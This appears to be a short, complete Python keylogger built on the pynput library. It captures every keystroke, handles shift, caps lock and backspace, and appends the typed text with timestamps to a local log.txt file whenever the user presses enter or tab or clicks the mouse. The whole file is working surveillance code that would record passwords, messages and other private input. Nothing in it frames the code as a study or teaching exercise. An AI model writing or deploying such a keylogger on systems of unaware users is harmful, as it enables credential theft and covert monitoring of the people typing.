import pynput
from pynput import keyboard
from pynput import mouse
from datetime import datetime

count = 0
keys = ""
shiftOn = False
capsOn = False
capsDown = False

def on_press(key):
    global keys, shiftOn, capsOn, capsDown
    #If we get a caps lock, then set that to true
    if key == keyboard.Key.caps_lock:
        if not capsDown:
            #toggle
            capsOn = not capsOn
        capsDown = True;
    
    #If we get a shift code, then toggle it on
    if key == keyboard.Key.shift:
        shiftOn = True

    #If we get a space code add a space character
    if key == keyboard.Key.space:
        keys = keys + " ";

    #If we get a backspace code, then delete a character
    if key == keyboard.Key.backspace:
        if(len(keys) > 0):
            keys = keys[:-1]
        
    #Only add in the characters
    if(len(str(key)) == 3):
        #caps lock
        if(capsOn):  
            if(shiftOn):
                keys = keys + str(key)[1]
            else:
                keys = keys + shiftKey(str(key)[1])
        else:
            if(shiftOn):
                keys = keys + shiftKey(str(key)[1])
            else:
                keys = keys + str(key)[1]

    #If the key is an tab, then create a new line
    if(key == keyboard.Key.tab):
        #write this to the file and clear it
        write_file(keys);
        keys = "";

    #If the key is an enter, then create a new line
    if(key == keyboard.Key.enter):
        #write this to the file and clear it
        write_file(keys);
        keys = "";

def shiftKey(key):
    switcher = {
        '`': '~',
        '1': '!',
        '2': '@',
        '3': '#',
        '4': '$',
        '5': '%',
        '6': '^',
        '7': '&',
        '8': '*',
        '9': '(',
        '0': ')',
        '-': '_',
        '=': '+',
        '[': '{',
        ']': '}',
        '\\': '|',
        ';': ':',
        '\'': '"',
        ',': '<',
        '.': '>',
        '/': '?'
    }

    return switcher.get(key, key.upper());
        

def write_file(keys):
    with open("log.txt", "a") as f:
        #only write if the keys is not empty
        if(keys != ""):
            #Create a timestamp and append
            timeStamp = datetime.now();
            f.write(str(timeStamp) + ": " + keys + "\n");
            
def on_release(key):
    global shiftOn, capsDown
    if key == keyboard.Key.shift:
        shiftOn = False
    if key == keyboard.Key.caps_lock:
        capsDown = False
    if key == keyboard.Key.esc:
        return False

def on_click(x, y, button, pressed):
    global keys
    #Check if the left mouse button was pressed, that means we should write a new line
    #This might be because the user clicks away from a field
    if button == mouse.Button.left:
        write_file(keys);
        keys = "";


with mouse.Listener(on_click=on_click) as listener:
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join();
    



    




